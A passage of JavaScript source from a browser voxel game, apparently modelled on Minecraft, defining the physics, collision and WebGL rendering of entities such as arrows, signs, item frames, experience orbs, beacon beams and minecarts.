    constructor(x,y,z,velx,vely,velz){
      super(blockIds.ironNugget, x,y,z)
      this.velx = velx
      this.vely = vely
      this.velz = velz
      this.despawns = 10000
      this.facesPlayer = true
      this.gravityStength = -0.02
    }
    update() {
			this.updateVelocity(now)
			this.move(now)
      
      this.canFacePlayer = true
		}
    move(now) {
			let pminX = floor(this.x - this.width / 2)
			let pmaxX = ceil(this.x + this.width / 2)
			let pminY = floor(this.y - this.height / 2)
			let pmaxY = ceil(this.y + this.height / 2)
			let pminZ = floor(this.z - this.depth / 2)
			let pmaxZ = ceil(this.z + this.depth / 2)
			let block = null

      this.liquid = false
			for (let x = pminX; x <= pmaxX; x++) {
				for (let y = pminY; y <= pmaxY; y++) {
					for (let z = pminZ; z <= pmaxZ; z++) {
						let block = this.world.getBlock(x, y, z, this.dimension)
						if (block && blockData[block].solid) {
							this.contacts.add(x, y, z, block)
						}
            if(x === round(this.x) && z === round(this.z) && blockData[block].liquid){
              this.liquid = true
            }
					}
				}
			}

			this.previousX = this.x
			this.previousY = this.y
			this.previousZ = this.z

      var xBounce, yBounce, zBounce, pvelx = this.velx, pvely = this.vely, pvelz = this.velz
      
			this.canStepX = false
			this.canStepY = false
			this.onGround = false
      this.hasCollided = false
			//Check collisions in the Y direction
			this.y += this.vely
			for (let i = 0; i < this.contacts.size; i++) {
				block = this.contacts.array[i]
				if (this.collided(block[0], block[1], block[2], null, this.vely, null, block[3])) {
					this.y = this.previousY
					this.vely = 0
          this.hasCollided = true
          yBounce = true
					break
				}
			}

			if (this.y === this.previousY) {
				this.canStepX = true
				this.canStepZ = true
			}

			//Check collisions in the X direction
			this.x += this.velx
			for (let i = 0; i < this.contacts.size; i++) {
				block = this.contacts.array[i]
				if (this.collided(block[0], block[1], block[2], this.velx, null, null, block[3])) {
					if (this.canStepX && !this.world.getBlock(block[0], block[1] + 1, block[2], this.dimension) && !this.world.getBlock(block[0], block[1] + 2, block[2], this.dimension)) {
						continue
					}
					this.x = this.previousX
					this.velx = 0
          this.hasCollided = true
          xBounce = true
					break
				}
			}

			//Check collisions in the Z direction
			this.z += this.velz
			for (let i = 0; i < this.contacts.size; i++) {
				block = this.contacts.array[i]
				if (this.collided(block[0], block[1], block[2], null, null, this.velz, block[3])) {
					if (this.canStepZ && !this.world.getBlock(block[0], block[1] + 1, block[2], this.dimension) && !this.world.getBlock(block[0], block[1] + 2, block[2]), this.dimension) {
						continue
					}
					this.z = this.previousZ
					this.velz = 0
          this.hasCollided = true
          zBounce = true
					break
				}
			}
      
      if(this.onGround){
        this.hasCollided = true
      }
      
      if(xBounce) this.velx = -pvelx
      if(yBounce) this.vely = -pvely
      if(zBounce) this.velz = -pvelz

			this.updateChunk()

			this.lastUpdate = now
			this.contacts.clear()
		}
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++

      if(this.canFacePlayer) {
        this.facePlayer()
        this.canFacePlayer = false
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
  entities[entities.length] = class Arrow extends Entity{
		static name2 = "Arrow"
    constructor(x,y,z,dx,dy,dz, from){
      let t = textureCoords[textureMap.arrow]
      let v = generateVAO(shapes.arrow, t[0],t[1],t[2]-t[0],t[5]-t[1])
      super(x, y, z, 0, 0, dx, dy, dz, 0.25, 0.25, 0.25, null, null, v.size, 60000, v.vao)
			this.noHitbox = true
			this.from = from
    }
		updateVelocity(now) {
			this.vely += -0.005
			let drag = this.liquid ? 0.7 : 0.99
			if(blockData[this.standingOn].slide) drag = blockData[this.standingOn].slide
			this.velz += (this.velz * drag - this.velz)
			this.velx += (this.velx * drag - this.velx)
			this.vely += (this.vely * drag - this.vely)
		}
    update(){
			let pvelx = this.velx
			let pvely = this.vely
			let pvelz = this.velz
			this.updateVelocity(now)
			this.move(now)
			if(this.hasCollided){
				this.x = this.previousX
				this.y = this.previousY
				this.z = this.previousZ
				this.velx = pvelx
				this.vely = pvely
				this.velz = pvelz
			}
		
			this.yaw = Math.PId - (atan2(this.velz, this.velx) + Math.PI2 + Math.PI)
			var adjacent = sqrt(this.velx*this.velx+this.velz*this.velz)
			this.pitch = Math.PId - atan2(this.vely, adjacent)
    }
    render() {
      totalEntites++
      if(this.hidden || !p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      gl.uniform1f(glCache.harmEffectEntity, 0)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
  
  entities[entities.length] = class Sign extends Entity{
		static name2 = "Sign"
    constructor(x,y,z,base,block){
			let signBlock = (block & STAIR) === STAIR ? (base | CROSS) : (base | SLAB)
      const v = generateBlockVAO(signBlock, {poleSide:blockData[block].poleSide,poleTop:blockData[block].poleTop})
			super(x, y, z, 0, 0, 0, 0, 0, 1, 1, 1, null,null, v.size, Infinity, v.vao)
      this.width = this.height = this.depth = 16/24
      this.offsetY = -0.15
      this.from = p.id
      this.baseBlock = base
      this.noHitbox = true
      this.textEnt = null, this.textEnt2 = null
      this.prevText = null, this.prevText2 = null
      this.remote = true
      
      this.gravityStength = 0
    }
    update() {
			let block = this.world.getBlock(this.x,this.y,this.z,this.dimension)
			if(block != this.baseBlock){
      	if((block&isCube) !== this.baseBlock) this.canDespawn = true
				else{
					let base = this.baseBlock
					let signBlock = (block & STAIR) === STAIR ? (base | CROSS) : (base | SLAB)
					let v = generateBlockVAO(signBlock)
		      this.faces = v.size
					this.vao = v.vao
				}
			}
      //if(host && this.canDespawn) return blockParticles(this.block,this.x,this.y,this.z,30, "break",this.world,this.dimension)
      
      let tags = this.world.getTags(this.x,this.y,this.z,this.dimension)
      if(tags){
        var rotation = tags.rot || 0
        this.yaw = -rotation * Math.PId / 16
        if(this.textEnt){
          this.textEnt.yaw = this.yaw + Math.PI
					if(tags.color){
            this.textEnt.color = tags.color
          }else if(blockData[this.baseBlock].color){
            var data = blockData[this.baseBlock].color
            this.textEnt.color[0] = data[0]
            this.textEnt.color[1] = data[1]
            this.textEnt.color[2] = data[2]
          }
					this.textEnt.glow = !!tags.glow
        }
				if(this.textEnt2){
          this.textEnt2.yaw = this.yaw
					if(tags.color){
            this.textEnt2.color = tags.color
          }else if(blockData[this.baseBlock].color){
            var data = blockData[this.baseBlock].color
            this.textEnt2.color[0] = data[0]
            this.textEnt2.color[1] = data[1]
            this.textEnt2.color[2] = data[2]
          }
					this.textEnt2.glow = !!tags.glow2
        }
        if(tags.text !== this.prevText && (tags.text || tags.text === "")){
          this.prevText = tags.text
          if(this.textEnt){
            this.textEnt.setText(tags.text)
          }else{
            this.textEnt = this.world.generateTextForEntity(tags.text,this,1/8,[0,0,0],null)
            if((block & isState) === STAIR){
              this.textEnt.offsetZ = -5.5/16
            }else{
              this.textEnt.offsetZ = 1/16
              this.textEnt.y += 0.35
            }
          }
        }
				if(tags.text2 !== this.prevText2 && (tags.text2 || tags.text2 === "")){
          this.prevText2 = tags.text2
          if(this.textEnt2){
            this.textEnt2.setText(tags.text2)
          }else{
            this.textEnt2 = this.world.generateTextForEntity(tags.text2,this,1/8,[0,0,0],null)
            if((block & isState) === STAIR){
              this.textEnt2.offsetZ = 7.25/16
            }else{
              this.textEnt2.offsetZ = 1.25/16
              this.textEnt2.y += 0.35
            }
          }
        }
      }
		}
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width+this.extraSize,this.height+this.extraSize,this.depth+this.extraSize)) return
      renderedEntities++

      if(this.canFacePlayer) {
        this.facePlayer()
        this.canFacePlayer = false
      }
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = this.offsetY
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width + this.extraSize, this.height + this.extraSize, this.depth + this.extraSize)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      
      if(this.textEnt) this.textEnt.render()
			if(this.textEnt2) this.textEnt2.render()
    }
  }
  entities[entities.length] = class ItemFrame extends BlockEntity{
		static name2 = "ItemFrame"
    constructor(x,y,z,block,base){
      super(block,x,y,z)
      this.width = this.height = this.depth = 0.5
      this.baseBlock = base
      this.noHitbox = true
      this.remote = true
      this.rz = 0
      this.offsetX = 0, this.offsetZ = 0
      var off = 7/16
      switch(base & ROTATION){
        case NORTH:
          this.offsetZ = off
          break
        case SOUTH:
          this.offsetZ = -off
          this.yaw = Math.PI
          break
        case EAST:
          this.offsetX = off
          this.yaw = Math.PI2
          break
        case WEST:
          this.offsetX = -off
          this.yaw = -Math.PI2
          break
      }
    }
    update(){
      if(this.world.getBlock(this.x,this.y,this.z,this.dimension) !== this.baseBlock) this.canDespawn = true
      var rot = this.world.getTagByName(this.x,this.y,this.z,"rot",this.dimension) || 0
      this.rz = rot*Math.PId/8
      this.changeBlock(this.world.getTagByName(this.x,this.y,this.z,"block",this.dimension) || 0)
    }
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(this.x+this.offsetX, this.y, this.z+this.offsetZ)
			modelMatrix.rotX(this.pitch)
			modelMatrix.rotY(this.yaw)
      modelMatrix.rotZ(this.rz)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      gl.uniform1f(glCache.harmEffectEntity, 0)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    }
  }
  
  entities[entities.length] = class ExperienceOrb extends Entity{
		static name2 = "ExperienceOrb"
    //experienceOrb
    constructor(x,y,z,value){
      var i
      if(!value || value <= 2){
        i = 0
      }else if(value <= 6){
        i = 1
      }else if(value <= 16){
        i = 2
      }else if(value <= 36){
        i = 3
      }else if(value <= 72){
        i = 4
      }else if(value <= 148){
        i = 5
      }else if(value <= 306){
        i = 6
      }else if(value <= 616){
        i = 7
      }else if(value <= 1236){
        i = 8
      }else if(value <= 2476){
        i = 9
      }else if(value <= 32767){
        i = 10
      }
      super(x, y, z, 0, 0, 0, 0, 0, 0.5, 0.5, 0.5, null, null, experienceOrbVaos.size, 300000, experienceOrbVaos[i])
      this.amount = value
      this.tint = {r:1,g:1,b:1}
      this.noHitbox = true
      this.facesPlayer = true
    }
    goToPlayer(e){
      var dist = dist3(this.x,this.y,this.z,e.x,e.y-e.height*0.5,e.z)
      if(dist < 7.25){
        ////var speed = (7.25 - dist) / 10
        //var aDist = abs(dist)
        //var xd = this.x - p.x, zd = this.z - p.z;
        //var x = xd/*/abs(zd)*/; this.velx = (x-(Math.sign(x)*7.25)) / 150//; this.velx = -this.velx
        //if(this.onGround) {var y = this.y - (p.y-p.bottomH); this.vely = (y-(Math.sign(y)*7.25)) / 40/*; this.vely = -this.vely*/}
        //var z = zd/*/abs(xd)*/; this.velz = (z-(Math.sign(z)*7.25)) / 150//; this.velx = -this.velx
        this.moveTowards(e.x, e.y-e.height*0.5, e.z, 7.25,7.25,7.25, 5, true)
      }
    }
    update(){
      if(multiplayer) for(var i in players){
        if(!players[i].hidden && !players[i].die && players[i].dimension === this.dimension) this.goToPlayer(players[i])
      }
      
			this.updateVelocity(now)
			this.move(now)
      
      this.facePlayer()
      
      this.tint.r = min(max(abs((now-this.spawn) % 1000 - 500) / 500, 0), 1)
      this.tint.g = 1
      this.tint.b = 0
    }
    facePlayer(){
      this.yaw = Math.PId - (atan2(p.camera.z - this.z, p.camera.x - this.x) + Math.PI2 + Math.PI)
      var adjacent = dist2(this.x,this.z,p.camera.x,p.camera.z)
      this.pitch = Math.PId - atan2(p.camera.y - this.y, adjacent)
    }
    render(){
      totalEntites++
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++

      const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(this.x, this.y, this.z)
			modelMatrix.rotY(this.yaw)
			modelMatrix.rotX(this.pitch)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      gl.uniform1f(glCache.harmEffectEntity, 0)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
      gl.uniform3f(glCache.tintEntity, this.tint.r,this.tint.g,this.tint.b)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      gl.uniform3f(glCache.tintEntity, 1,1,1)
    }
  }

	entities[entities.length] = class BeaconBeam extends Entity{
		static name2 = "BeaconBeam"
		alwaysRender = true
		constructor(x,y,z){
      super(x, y+(maxHeight-y)/2, z, 0, 0, 0, 0, 0, 0.25, maxHeight - y, 0.25, null, null, 0, Infinity, glExtensions.vertex_array_object.createVertexArrayOES())
			this.willUpdateShape = true
			this.shader = 2
			this.remote = true
			this.noHitbox = true
			this.actualY = y
			this.prevColumn = null
			this.glow = true
    }
		generateVAO(y,y2,vao){
			const shape = shapes.cube
			const shapeVerts = shape.verts
			const shapeTexVerts = shape.texVerts
			const size = shape.size
			let tex = "beaconBeam"
			let blockSides = Object.keys(Block)
			let texture = []
			let index = 0
			let verts = [], vertIndex = 0
			let ay = this.actualY/maxHeight
			for (let n = 0; n < 6; n++) {
				let side = blockSides[n]
				let directionalFaces = shapeVerts[n]
				for (let facei = 0; facei < directionalFaces.length; facei++) {
					let texVerts = textureCoords[textureMap[tex]]
					let tx = texVerts[0]
					let ty = texVerts[1]
					let tw = texVerts[2] - tx
					let th = texVerts[5] - ty
					let texShapeVerts = shapeTexVerts[n][facei]
					let newY = ay+(1-ay)*y, newY2 = ay+(1-ay)*y2
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + lerp(texShapeVerts[1], newY,newY2)*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + lerp(texShapeVerts[3], newY,newY2)*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + lerp(texShapeVerts[5], newY,newY2)*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + lerp(texShapeVerts[7], newY,newY2)*th
					index += 8
					let face = directionalFaces[facei]
					verts[vertIndex] = face[0]
					verts[vertIndex+1] = map(face[1], -0.5,0.5, y-0.5,y2-0.5)
					verts[vertIndex+2] = face[2]
					verts[vertIndex+3] = face[3]
					verts[vertIndex+4] = map(face[4], -0.5,0.5, y-0.5,y2-0.5)
					verts[vertIndex+5] = face[5]
					verts[vertIndex+6] = face[6]
					verts[vertIndex+7] = map(face[7], -0.5,0.5, y-0.5,y2-0.5)
					verts[vertIndex+8] = face[8]
					verts[vertIndex+9] = face[9]
					verts[vertIndex+10] = map(face[10], -0.5,0.5, y-0.5,y2-0.5)
					verts[vertIndex+11] = face[11]
					vertIndex += 12
				}
			}
			const verticesBuffer = gl.createBuffer()
			const textureBuffer = gl.createBuffer()
			glExtensions.vertex_array_object.bindVertexArrayOES(vao)
			gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

			gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(verts), gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

			gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)

			gl.enableVertexAttribArray(glCache.aVertexEntity)
			gl.enableVertexAttribArray(glCache.aTextureEntity)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
			return {vao,size}
		}
		updateShape(){
			const top = this.world.getSolidTop(this.x,this.z,this.dimension)
			let parts = [1,1,1,0]
			let end = 1
			const height = maxHeight-this.actualY
			for(let y=this.actualY+1; y<=top; y++){
				const block = this.world.getBlock(this.x,y,this.z,this.dimension), data = blockData[block]
				if(data.solid && !data.transparent){
					end = map(y-0.5, this.actualY,maxHeight, 0,1)
					break
				}
				if(data.name.endsWith("StainedGlass")){
					let color = colors.dye[data.name.replace("StainedGlass","")]
					let y2 = map(y-0.5, this.actualY,maxHeight, 0,1)
					parts.push(y2)
					parts.push((color[0]+parts[parts.length-5])/2, (color[1]+parts[parts.length-4])/2, (color[2]+parts[parts.length-3])/2)
					parts.push(y2)
				}
			}
			parts.push(end)
			for(let i=0; i<parts.length; i+=5){
				let part = i && this.parts[i]
				const {vao,size} = this.generateVAO(parts[i+3],parts[i+4], i ? (part ? part.vao : glExtensions.vertex_array_object.createVertexArrayOES()) : this.vao)
				if(!i){
					this.faces = size
					this.tint = [parts[i],parts[i+1],parts[i+2]]
				}else{
					if(!part){
						part = this.addPart(i,size,vao,0,0,0,0.25,maxHeight-this.actualY,0.25,0,0)
						part.glow = true
					}
					part.size = size
					part.tint = [parts[i],parts[i+1],parts[i+2]]
				}
			}
			for(let part in this.parts){
				if(+part >= parts.length) delete this.parts[part]
			}
		}
		update() {
			let chunk = world.getChunk(this.chunkX*16,this.chunkZ*16,this.dimension)
			let h = chunk.columnHashs[(this.z&15)*16+(this.x&15)]
			if(h !== this.prevColumn){
				this.prevColumn = h
				this.willUpdateShape = true
			}
			if(this.willUpdateShape){
				this.updateShape()
				this.willUpdateShape = false
			}
			this.previousYaw = this.yaw
			this.yaw += 0.05
      if(this.yaw > Math.PId){
        this.yaw -= Math.PId
        this.previousYaw -= Math.PId
      }
			this.lastUpdate = now
			let block = this.world.getBlock(this.x,this.actualY,this.z,this.dimension)
			if(block !== (blockIds.beacon | BEACON)) this.canDespawn = true
		}
	}

	entities[entities.length] = class Minecart extends Entity{
		static name2 = "Minecart"
		pushes = true
		constructor(x,y,z){
			let tex = textureCoords[textureMap.minecart]
      let vao = generateVAO(shapes.minecart, tex[0],tex[1],tex[2]-tex[0],tex[5]-tex[1])
			super(x, y, z, 0, 0, 0, 0, 0, 0.98, 1, 0.98, null, null, vao.size, Infinity, vao.vao)
			this.health = 6
			this.noScale = true
			this.heightOnDiagonal = 1-this.width
			this.defaultHeight = this.height
			this.health = 6
			this.prevOnTrack = false
			this.rideOffsetY = -6/16
			this.canRide = true
		}
		updateVelocity(now) {
      this.standingOn = this.world.getBlock(round(this.x), floor(this.y-this.height/2), round(this.z), this.dimension)
      if(this.prevLiquid !== this.liquid){
        this.prevLiquid = this.liquid
      }
			this.vely += this.gravityStength
			let drag = this.liquid ? 0.7 : 0.95
			let yDrag = this.liquid ? 0.7 : 0.95
			if(blockData[this.standingOn].slide) drag = blockData[this.standingOn].slide
			this.velz += (this.velz * drag - this.velz)
			this.velx += (this.velx * drag - this.velx)
			this.vely += (this.vely * yDrag - this.vely)
		}
		update(){
			let railX = round(this.x), railY = round(this.y), railZ = round(this.z)
			let onBlock = this.world.getBlock(railX,railY,railZ,this.dimension)
			if(!blockData[onBlock].rail){
				let under = this.world.getBlock(railX,railY-1,railZ,this.dimension)//to allow diagonals
				if(blockData[under].rail) onBlock = under, railY--
			}

			this.updateVelocity(now)
			let {velx, vely, velz} = this
			let speed = sqrt(velx*velx+velz*velz+vely*vely)*2
			if(speed>1){
				this.velx /= speed, this.vely /= speed, this.velz /= speed
			}
			this.move(now)

			this.height = this.defaultHeight
			this.pitch = 0
			this.offsetY = 0
			if(onBlock && blockData[onBlock].rail){
				let rot = onBlock&ROTATION
				let {prevOnTrack} = this
				if((onBlock & isState) === CUBE){
					let velMag = sqrt(velx*velx+velz*velz)
					if(rot === NORTH || rot === SOUTH) this.velz = prevOnTrack ? velMag*Math.sign(velz) : velz, this.velx = 0, this.x = railX, this.yaw = round(this.yaw/Math.PI)*Math.PI
					else if(rot === EAST || rot === WEST) this.velx = prevOnTrack ? velMag*Math.sign(velx) : velx, this.velz = 0, this.z = railZ, this.yaw = round((this.yaw-Math.PI2)/Math.PI)*Math.PI+Math.PI2
					this.vely = 0, this.y = railY
					this.prevOnTrack = true
				}else if((onBlock & isState) === STAIR){//corner rail
					let originX, originZ
					if(rot === NORTH) originX = railX-0.5, originZ = railZ-0.5
					else if(rot === WEST) originX = railX+0.5, originZ = railZ-0.5
					else if(rot === SOUTH) originX = railX+0.5, originZ = railZ+0.5
					else if(rot === EAST) originX = railX-0.5, originZ = railZ+0.5
					let dx = this.x-originX, dz = this.z-originZ
					let mag = sqrt(dx*dx+dz*dz)*2
					dx /= mag, dz /= mag
					this.x = originX+dx
					this.z = originZ+dz
					let targetYaw = atan2(dx,dz)+Math.PI2
					this.yaw = round((this.yaw-targetYaw)/Math.PI)*Math.PI+targetYaw
					//below: calculate new velocity
					let velMag = sqrt(velx*velx+velz*velz)
					let prevDir = velx*dz + velz*-dx//more accurate if use previous dx and dz
					let s = dz*2, c = -dx*2
					if(prevOnTrack){
						prevDir = Math.sign(prevDir)
						this.velx = velMag*s*prevDir
						this.velz = velMag*c*prevDir
					}else{
						this.velx = prevDir*s
						this.velz = prevDir*c
					}
					this.vely = 0, this.y = railY
					//this.world.blockParticles(4,this.x+Math.sign(velMag)*sin(this.yaw),7,this.z+Math.sign(velMag)*cos(this.yaw),1,'','')
					/*//stop velocity in certain direction
					let dot = this.velx*dx + this.velz*dz
					this.velx = this.velx - dx * dot
					this.velz = this.velz - dz * dot*/
					this.prevOnTrack = true
